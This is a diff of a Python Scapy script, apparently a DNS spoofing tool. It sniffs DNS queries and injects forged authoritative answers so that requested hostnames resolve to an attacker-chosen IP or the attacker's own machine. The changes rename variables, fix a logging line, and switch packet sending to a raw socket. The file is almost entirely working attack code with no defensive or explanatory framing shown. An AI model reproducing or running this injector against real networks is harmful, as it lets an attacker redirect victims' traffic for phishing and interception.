@@ -37,32 +37,28 @@ def get_args():
 def dns_packet(packet):
 	global hosts, my_ip, soc
 	if ((UDP in packet) and (packet.dport == 53) and (DNSRR not in packet)):
-		print "Query", hosts[packet[DNSQR].qname[:-1]]
+		print "Query", packet[DNSQR].qname[:-1]
 		if (packet[DNSQR].qname[:-1] in hosts):
-			spoofed_ip = hosts[packet[DNSQR].qname[:-1]];
+			spf_ip = hosts[packet[DNSQR].qname[:-1]];
 		elif (len(hosts) == 0):
-			spoofed_ip = my_ip;
+			spf_ip = my_ip;
 		else:
 			print "Will Not Inject"
 			return
-		
-		print "Spoofed IP is", spoofed_ip;
-		spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst)/\
+
+		print "Spoofed IP is", spf_ip;
+		spf_pkt = IP(dst=packet[IP].src, src=packet[IP].dst)/\
 			UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
 			DNS(id=packet[DNS].id,
 				qd=DNSQR(qname=packet[DNSQR].qname),
 				aa = 1,
 				qr = 1,
-				an=DNSRR(rrname=packet[DNS].qd.qname, rdata=spoofed_ip));
-		send(spoofed_pkt);
-"""
-		spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst)/\
-			UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
-			DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr = 1, \
-			an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=spoofed_ip))
-"""
+				an=DNSRR(rrname=packet[DNS].qd.qname, rdata=spf_ip));
+		soc.sendto(str(spf_pkt), (packet[IP].src, packet[UDP].sport));
+
 
 if __name__ == '__main__':
+	global soc
 	[i, h, exp] = get_args();
 	soc = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW);
 	if (i) :
